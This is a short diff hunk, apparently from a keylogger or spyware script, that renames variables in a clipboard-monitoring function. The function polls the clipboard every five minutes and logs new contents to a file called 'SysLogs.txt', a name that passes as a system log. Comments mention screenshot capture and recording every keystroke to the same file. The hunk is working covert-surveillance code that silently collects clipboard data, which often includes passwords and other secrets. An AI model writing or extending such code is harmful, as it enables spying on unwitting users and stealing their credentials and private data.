@@ -31,13 +31,13 @@ def captureScreenshot():
 
 #Every 5mins the contents of the clipboard are copied and stored in the SysLogs.txt file with a unique [Clipboard] tag to differentiate it
 def monitorClipboard():
-    previous_clipboard = ""
+    previousClipboard = ""
     while True:
-        clipboard_text = paste()
-        if clipboard_text != previous_clipboard:
+        clipboardText = paste()
+        if clipboardText != previousClipboard:
             with open(logFile, "a") as file:
-                file.write(f"[Clipboard]: {clipboard_text}\n")
-            previous_clipboard = clipboard_text
+                file.write(f"[Clipboard]: {clipboardText}\n")
+            previousClipboard = clipboardText
         sleep(300)
 
 #All keystrokes are recorded into a file called SysLogs.txt
